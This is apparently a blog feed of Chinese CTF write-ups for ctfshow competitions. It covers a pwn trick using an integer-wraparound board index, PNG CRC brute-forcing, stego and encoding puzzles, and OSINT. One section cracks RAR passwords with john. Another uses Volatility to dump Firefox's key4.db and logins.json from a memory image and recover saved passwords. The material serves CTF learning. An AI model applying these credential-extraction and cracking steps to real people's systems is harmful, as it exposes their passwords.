<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%95%E5%90%91%E5%8A%A0%E5%AF%86.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="炒鸡好玩的井字棋"><a href="#炒鸡好玩的井字棋" class="headerlink" title="炒鸡好玩的井字棋"></a>炒鸡好玩的井字棋</h2><p>根据给的c代码，可以知道基本判断逻辑，检查输入是否小于3，检查是否有负号<br>但是没有检测棋子的范围，所以可以下在<code>-1</code>这样的位置，用<code>2^32-1</code>来输出<code>-1</code></p>
<p>先正常下两个相连的棋子<br>[0,0],[0,1]<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%82%92%E9%B8%A1%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%BA%95%E5%AD%97%E6%A3%8B-1.png"></p>
<p>然后输入[0,4294967295],其实就是[0,-1]<br>三个棋子一条线相连，得到flag</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>击剑杯</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】吃鸡杯-misc-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E5%90%83%E9%B8%A1%E6%9D%AF-misc-wp.html</url>
    <content><![CDATA[<h1 id="Fortune-Cookie"><a href="#Fortune-Cookie" class="headerlink" title="Fortune Cookie"></a>Fortune Cookie</h1><p>动态的misc题目,第一次见，挺有新意的<br>图片下载后发现是png图片，那么就用tweakpng先查看crc<br>报错了，但是图片能打开，所以是图片的宽高被改变了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb1.png"><br>用脚本爆破图片的宽高</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br>m = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>        c = m[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc = binascii.crc32(c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc == <span class="hljs-number">0x91918666</span>:       //crc<br>            k = <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
<p>将图片的宽高修改为爆破出来的值<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb2.png"><br>修改后再次用tweakpng查看图片的idat块<br>发现第一个idat块很小，将这个块删除<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb3.png"><br>得到原始图片(放个小图，嘿嘿嘿，完整的大家自己做试试吧)<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb4.png"><br>用stegsolve查看，会发现3个颜色通道的0通道有”异常”,保存下来<br>仔细观察，会发现左上角存在有规律的偏移<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb5.png"><br>用stegsolve的stereogram solver功能进行偏移<br>当偏移到20的时候出现了文字信息，提示已经很明显了，我们换个方向再次进行偏移<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb6.png"><br>我在偏移量为187的时候得到了flag</p>
<h1 id="zipper-clipper-not-need-john-the-ripper"><a href="#zipper-clipper-not-need-john-the-ripper" class="headerlink" title="zipper, clipper, not need john the ripper"></a>zipper, clipper, not need john the ripper</h1><p>发现在windows下和linux下解压的内容不一样<br>因为windows下的文件夹名是不区分大小写的，解压后会合并<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb17.png"></p>
<p>解压后共有58个，猜测是base58<br>用脚本解，注意有几个字母是没有的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,base58<br><br>text = [<span class="hljs-string">&#x27;&#x27;</span>] * <span class="hljs-number">1000</span><br>dic = <span class="hljs-string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    numlist = os.listdir(<span class="hljs-string">f&#x27;./file/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> numlist:<br>        text[<span class="hljs-built_in">int</span>(j)] = i<br><br>t = base58.b58decode(<span class="hljs-string">&#x27;&#x27;</span>.join(text).encode()).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span> + t.split(<span class="hljs-string">&#x27;&#123;&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;&#125;&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>这个flag也是动态的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb18.png"></p>
<h1 id="mumuzi的照片"><a href="#mumuzi的照片" class="headerlink" title="mumuzi的照片"></a>mumuzi的照片</h1><p>根据hint.png，首先爆破base64编码表<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;im_not_tao_god.txt.encode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    a=f.read()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;im_not_tao_god.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> b:<br>    b=base64.b64encode(b.read()).decode()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;mumuzi.rar.encode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    timu=f.read()<br><br>l=<span class="hljs-string">&#x27;&#x27;</span><br>k=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> a[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> l:<br>        l=l+a[i]<br>        k=k+b[i]<br><br>d=&#123;&#125;<br>x=string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="hljs-string">&quot;+/=&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(k)):<br>    d[l[i]]=k[i]<br>yuanwen=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> l:<br>        yuanwen=yuanwen+i<br><br><br>miwen=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> k:<br>       miwen=miwen+i<br><span class="hljs-built_in">print</span>(yuanwen,miwen)<br><br><span class="hljs-keyword">for</span> order <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(permutations(miwen,<span class="hljs-number">4</span>)):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(yuanwen)):<br>        d[yuanwen[i]]=order[i]<br>    s=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> timu:<br>        s=s+d[j]<br>    bs=base64.b64decode(s)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output\\&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join(order)+<span class="hljs-string">&#x27;.rar&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        f.write(bs)<br></code></pre></td></tr></table></figure>
<p>爆破后得到一个真的压缩包，其他的压缩包是坏的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb19.png"><br>解压后得到一个helloworld.txt和flag.rar<br>在hint.png中可以得到flag.rar 的密码范围是0-1234<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb20.png"><br>用shell脚本爆破<br>先生成密码字典，可以用crunch命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">crunch</span> <span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">0123456789</span>  &gt;&gt; passwd.txt<br></code></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">while</span> [ -f <span class="hljs-string">&quot;rars/flag.rar&quot;</span> ]<br><span class="hljs-keyword">do</span><br>	mv .<span class="hljs-regexp">/rars/</span>flag.rar .<span class="hljs-regexp">/rars/</span>flag_.rar<br>	rar2john .<span class="hljs-regexp">/rars/</span>flag_.rar &gt;hash.txt<br>	john hash.txt --wordlist=passwd.txt<br>	password=`john hash.txt --show|head -n1|cut -d<span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">2</span>`<br>	unrar e -o+ .<span class="hljs-regexp">/rars/</span>flag_.rar .<span class="hljs-regexp">/rars/</span> -p<span class="hljs-variable">$&#123;password&#125;</span><br>done<br></code></pre></td></tr></table></figure>
<p>爆破了大概一个小时。。。结果还是假的<br>最后得到的txt文件里写着：flag不在这里，你得往回走。<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb22.png"></p>
<p>观察最后的flag.rar得知rar文件是有注释的将所有注释提取出来</p>
<p>根据txt的提示，flag得往回走，观察最后一段注释，发现是png文件头反过来，将所有注释连在一起然后reverse，得到png文件</p>
<p>用010打开图片，CRC报错说明宽高被改过了，爆破出正确的宽度然后binwalk可以发现提示：我就知道你们只喜欢loli不喜欢我，我都穿成这样了你还不知道该对我（png，绝对不是mumuzi）做什么么？</p>
<p>说明是brainfuck的brainloller模式，直接bftools一下这个图片就出来了bftools.exe decode brainloller mumuzi.png得到flag</p>
<h1 id="火烤大牛1-0"><a href="#火烤大牛1-0" class="headerlink" title="火烤大牛1.0"></a>火烤大牛1.0</h1><p>补上PLTE和修改宽高即可</p>
<h1 id="信守着承诺"><a href="#信守着承诺" class="headerlink" title="信守着承诺"></a>信守着承诺</h1><p>根据提示找到一个信息</p>
<blockquote>
<p>信守着承诺</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb12.png"></p>
<p>在文件中发现zip结构，用foremost分离后发现一个带密码的压缩包<br>用歌词成功解压<br>结尾处有一串base64加密的字符串<br>解密后就是flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb13.png"></p>
<h1 id="在？看看密码"><a href="#在？看看密码" class="headerlink" title="在？看看密码"></a>在？看看密码</h1><p>非预期解<br>直接可以找到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb8.png"></p>
<p>预期解<br>利用volatility<br>先imageinfo和pslist分析<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb9.png"><br>然后就是找密码了<br>因为firefox的密码管理器db和json文件存放在Roaming\Mozilla\Firefox\profiles\xxxxxxx.default\key4.db和logins.json。所以直接找这两个，然后用github的firefox密码查看器脚本或者用软件即可</p>
<blockquote>
<p>先查看在下载<br>volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 filescan |grep ‘key4.db’<br>volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 filescan |grep ‘logins.json’<br>volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d6ab4b0 -D .&#x2F;<br>volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003ec70d00 -D .&#x2F;</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb10.png"><br>拿到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb11.png"></p>
<h1 id="qcode"><a href="#qcode" class="headerlink" title="qcode"></a>qcode</h1><p>解压得到很多个二维码图片<br>使用脚本批量扫描</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyzbar.pyzbar <span class="hljs-keyword">as</span> pyzbar<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br>path = <span class="hljs-string">&#x27;C:\\Users\\username\\Desktop\\qcode&#x27;</span><br>texts = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">9424</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">9424</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(path):<br>    <span class="hljs-built_in">list</span>[i] = filename<br>    i += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;目录文件获取完毕&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>))):<br>    img = Image.<span class="hljs-built_in">open</span>(path +<span class="hljs-string">&#x27;\\&#x27;</span>+ <span class="hljs-built_in">list</span>[i])<br>    texts[i] = pyzbar.decode(img)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图像信息获取完毕&#x27;</span>)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(texts)):<br>    <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> texts[j]:<br>        tmp = text.data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span> <span class="hljs-keyword">in</span> tmp):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;二维码 &#x27;</span> + <span class="hljs-built_in">list</span>[j] + <span class="hljs-string">&#x27; 解码出ctfshow：&#x27;</span> + tmp)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> tmp):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;二维码 &#x27;</span> + <span class="hljs-built_in">list</span>[j] + <span class="hljs-string">&#x27; 解码出flag：&#x27;</span> + tmp)<br><br></code></pre></td></tr></table></figure>
<p>得到一个假的flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb14.png"><br>发现这张图片中还带有zip<br>用binwalk或foremost分离出来<br>解压后有flaag.txt和glb两个文件<br><a href="https://jingyan.baidu.com/article/3aed632e7634b731108091cf.html">打开glb文件的百度经验</a><br>改名为1.glb打开<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb15.png"><br>得到两串字符</p>
<blockquote>
<p>The key:12</p>
</blockquote>
<blockquote>
<p>First kaisa second fence key</p>
</blockquote>
<p>打开flaag.txt<br>开头是一个假的flag<br>后面是大量的255，用脚本进行画图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flaag.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(f)):<br>    s = f[i].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>        <span class="hljs-keyword">if</span>(s[j] == <span class="hljs-string">&#x27;255&#x27;</span>):<br>            pic.putpixel((j,i),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">elif</span> s[j].find(<span class="hljs-string">&#x27;\n&#x27;</span>)&gt;<span class="hljs-number">0</span>:<br>            pic.putpixel((j,i),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel((j,i),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>pic.save(<span class="hljs-string">&quot;qcode.png&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>得到这样一张图片<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/cjb16.png"><br>然后根据key<br>先<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒12</a>，再<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏12</a>即可得到flag</p>
<blockquote>
<p>od0dfmz_rf_Begfdtxtaam1nifex{u_qOaIy0zm}zefs_q<br>cr0rtan_ft_Psutrhlhooa1bwtsl{i_eCoWm0na}nstg_e     凯撒12<br>ctfshow{C0ngratulations_0n_th1s_Water_Problem}     栅栏12</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】月饼杯(第二届)-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E6%9C%88%E9%A5%BC%E6%9D%AF(%E7%AC%AC%E4%BA%8C%E5%B1%8A)-wp.html</url>
    <content><![CDATA[<p>技术有限，只解出部分题目<br>睡觉前还是前10的，一觉醒来就没了，呜呜呜:(</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="我的木头啊！！！"><a href="#我的木头啊！！！" class="headerlink" title="我的木头啊！！！"></a>我的木头啊！！！</h2><p>根据提示为栅栏加密<br>但不是普通的栅栏，而是W型<br>解出来后就是base全家桶了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%A8%E5%A4%B4%E5%95%8A%EF%BC%81%EF%BC%81%EF%BC%81.png"></p>
<h2 id="一封信"><a href="#一封信" class="headerlink" title="一封信"></a>一封信</h2><p><a href="https://aghorler.github.io/emoji-aes/">网站</a>直接一把梭，密钥在题目中<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%80%E5%B0%81%E4%BF%A11.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h2><p>在图片的最后有一串base64加密的字符串，解码即可</p>
<h2 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h2><p>图片备注中得到关键信息<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C1.png"><br>汉明码不会算<br><a href="https://blog.csdn.net/qq_19782019/article/details/87452394">参考文章</a></p>
<h2 id="HelloFlag"><a href="#HelloFlag" class="headerlink" title="HelloFlag"></a>HelloFlag</h2><p>第一次做这种区块链的题目<br>感觉是非预期了<br>首先下载MetaMask这个插件<br>打开网址<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/helloflag1.png"><br>将地址替换为题目中的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/helloflag2.png"><br>点这个（我瞎点的）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/helloflag3.png"><br>查看更多信息<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/helloflag4.png"><br>转成UTF-8就能看到flag了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/helloflag5.png"></p>
<h2 id="project-Tao-1"><a href="#project-Tao-1" class="headerlink" title="project Tao-1"></a>project Tao-1</h2><p>太套了吧<br>log中并没有任何有用的信息就不放出来了<br>第零关：&#x2F;W4lc0me  没啥好说的，直接下一关<br>第一关：&#x2F;Letsstart 源码里有<br>第二关：&#x2F;some_informations 根据提示找到错误，那就是去掉s<br>第三关：&#x2F;some_information 有色块，转成ascii<code>G0od! Next /CTFG0d</code><br>第四关：&#x2F;CTFG0d 有一串加密字符串，先base64–&gt;base16–&gt;base64–&gt;base32,得到<code>ecalptx4N/</code> 反转一下<code>/N4xtplace</code><br>第五关：&#x2F;N4xtplace 源代码中的颜文字aaencode解密一下<br>第六关：&#x2F;cftla5gsh0w title的提示去掉flag<br>第七关：&#x2F;ct5sh0w 源码中有一张二维码，修复一下<br>第八关：&#x2F;t308g0d 一张图片，下载后改高度（原来crc没报错的情况下高度不一定正确（8神说高度和IHDR块的CRC都被改了））</p>
<h2 id="project-Tao-2"><a href="#project-Tao-2" class="headerlink" title="project Tao-2"></a>project Tao-2</h2><p>第九关：&#x2F;DEADSOUL<br>就是第八关的图片名字</p>
<p>第十关：&#x2F;HIRE<br>提示知乎彩蛋<br>在console可以找到<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tao2-1.png"></p>
<p>第十一关：&#x2F;about_baidu<br>log提示说访问图片<br>找到图片的RGB值和alpha值（就是ps中灰度滑块的值）<br>即14.215.117.35，访问是百度首页<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tao2-2.png"><br>根据提示找到地址<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tao2-3.png"></p>
<p>第十二关：&#x2F;ns<br>在地图上将诗句中的地名连接起来<br>组成两个字母ns</p>
<p>第十三关：&#x2F;ONLY2GAME<br>根据log，发现是莫斯密码<br>将SAYL7UNIT用莫斯加密<br>然后-和.互换再次解密</p>
<p>第十四关：&#x2F;TAOFINAL<br>5bit编码——&gt;博多密码<br><a href="https://www.boxentriq.com/code-breaking/baudot-code">在线解码</a><br>将.换成0，-换成1</p>
<p>最终：flag在图片最后面</p>
<h2 id="月饼起义"><a href="#月饼起义" class="headerlink" title="月饼起义"></a>月饼起义</h2><p>第一次出题目，有点激动，哈哈哈<br>感谢@rot的出题协助</p>
<p>1：首先下载，得到一个压缩包，但是不能直接解压，是损坏的<br>可以看到有一个hint.txt<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%891.png"><br>尝试用binwalk分离<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%892.png"><br>查看这个文本<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%893.png"><br>是零宽隐写<br>解出来一个hint：170，<br>哎但是暂时没啥用<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%894.png"></p>
<p>2：再回去查看压缩包<br>会发现中间隐藏了一个文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%895.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%896.png"><br>提取出来后异或之前得到的数值170<br>脚本如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>d=f<span class="hljs-selector-class">.read</span>(<span class="hljs-number">9999999</span>)<br>e=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> d:<br>    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">170</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_xor&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f<span class="hljs-selector-class">.write</span>(e)<br>f<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure>
<p>观察到有89 50 4e 即png图片头<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%897.png"><br>逆序脚本：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_xor&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>d=f<span class="hljs-selector-class">.read</span>(<span class="hljs-number">9999999</span>)<br>d=d<span class="hljs-selector-attr">[::-1]</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f<span class="hljs-selector-class">.write</span>(d)<br>f<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure>
<p>然后使用stegsolve 查看通道信息<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E8%B5%B7%E4%B9%898.png"><br>得到最终的flag图片</p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="幸福小镇"><a href="#幸福小镇" class="headerlink" title="幸福小镇"></a>幸福小镇</h2><p>百度百科可以看到所有信息，角色，配音等都在里面<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/xfxz.png"></p>
<h2 id="PS打卡第一天"><a href="#PS打卡第一天" class="headerlink" title="PS打卡第一天"></a>PS打卡第一天</h2><p>先改后缀为psd<br>把4张图片导出<br>百度识图搜冬天这张<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/PS%E6%89%93%E5%8D%A1%E7%AC%AC%E4%B8%80%E5%A4%A91.png"><br>看到了域名为兰州大学<br>直接交试试看，没想到真是兰州大学<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/PS%E6%89%93%E5%8D%A1%E7%AC%AC%E4%B8%80%E5%A4%A92.png"></p>
<h2 id="抬头看看"><a href="#抬头看看" class="headerlink" title="抬头看看"></a>抬头看看</h2><p>直接老朋友谷歌识图<br>找到几篇新闻，都是近期发生的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%8A%AC%E5%A4%B4%E7%9C%8B%E7%9C%8B1.png"><br>在新闻中得到关键信息The lvy餐厅<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%8A%AC%E5%A4%B4%E7%9C%8B%E7%9C%8B2.png"><br>谷歌地图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%8A%AC%E5%A4%B4%E7%9C%8B%E7%9C%8B3.png"><br>实景看看<br>嗯，一模一样，剩下的就不说了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/4GCTaQ.md.png"></p>
